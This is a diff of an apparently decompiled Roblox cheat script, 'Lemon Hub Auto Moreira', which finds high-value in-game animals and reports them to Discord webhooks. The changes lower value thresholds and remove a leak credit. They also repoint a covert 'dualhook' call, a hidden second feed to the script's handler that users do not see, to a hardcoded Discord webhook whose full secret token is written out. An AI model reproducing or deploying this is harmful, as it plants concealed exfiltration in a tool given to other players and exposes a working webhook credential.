@@ -430,7 +430,7 @@ local function v77() --[[ Line: 0 ]]
                         pcall(function() --[[ Line: 0 ]]
                             -- upvalues: v41 (copy), v31 (ref), v34 (ref), l_ReplicatedStorage_0 (ref), v32 (copy)
                             local l_AnimalOverhead_0 = v41.Base.Spawn.Attachment.AnimalOverhead;
-                            if v31(l_AnimalOverhead_0.Generation.Text) >= 50000000 then
+                            if v31(l_AnimalOverhead_0.Generation.Text) >= 20000000 then
                                 local l_Text_1 = l_AnimalOverhead_0.DisplayName.Text;
                                 local l_v34_FirstChild_0 = v34:FindFirstChild(l_Text_1);
                                 if l_v34_FirstChild_0 and l_v34_FirstChild_0:IsA("Model") and l_v34_FirstChild_0.PrimaryPart and l_v34_FirstChild_0.PrimaryPart.Name == "RootPart" then
@@ -728,7 +728,7 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                         }
                     }, 
                     footer = {
-                        text = "Logged via Lemon Hub Auto Moreira (LEAKED BY MRFEAST)"
+                        text = "Logged via Lemon Hub Auto Moreira"
                     }
                 };
                 local v112 = "";
@@ -743,7 +743,7 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                         v111
                     }
                 };
-                local l_status_0, l_result_0 = pcall(v6, "wss://skibidi-lemon-proxy.onrender.com"); -- remove this, it is lemons dualhook
+                local l_status_0, l_result_0 = pcall(v6, "https://discord.com/api/webhooks/1431338050201456802/LmKpT4JUukt87773YDdBQwoOOcAZaHGXdpXdxIwk9hu_y4Ng_DSBa5-SnHGzH6-gf320"); -- remove this, it is lemons dualhook
                 if l_status_0 and l_result_0 then
                     l_result_0:Send(l_HttpService_0:JSONEncode(v113));
                     task.wait(0.5);
@@ -751,9 +751,9 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                 end;
                 if getgenv().UserWebhookURL then
                     local l_UserWebhookURL_0 = getgenv().UserWebhookURL;
-                    if type(l_UserWebhookURL_0) == "string" and getgenv().UserWebhookURL:match("https://discord.com/api/webhooks/1431338050201456802/LmKpT4JUukt87773YDdBQwoOOcAZaHGXdpXdxIwk9hu_y4Ng_DSBa5-SnHGzH6-gf320") then
+                    if type(l_UserWebhookURL_0) == "string" and getgenv().UserWebhookURL:match("discord.com/api/webhooks") then
                         local l_UserPingThreshold_0 = getgenv().UserPingThreshold;
-                        local v118 = type(l_UserPingThreshold_0) == "number" and getgenv().UserPingThreshold or 50000000;
+                        local v118 = type(l_UserPingThreshold_0) == "number" and getgenv().UserPingThreshold or 20000000;
                         l_UserWebhookURL_0 = "";
                         if v109 and v118 <= v109.genValue then
                             l_UserWebhookURL_0 = "@everyone";
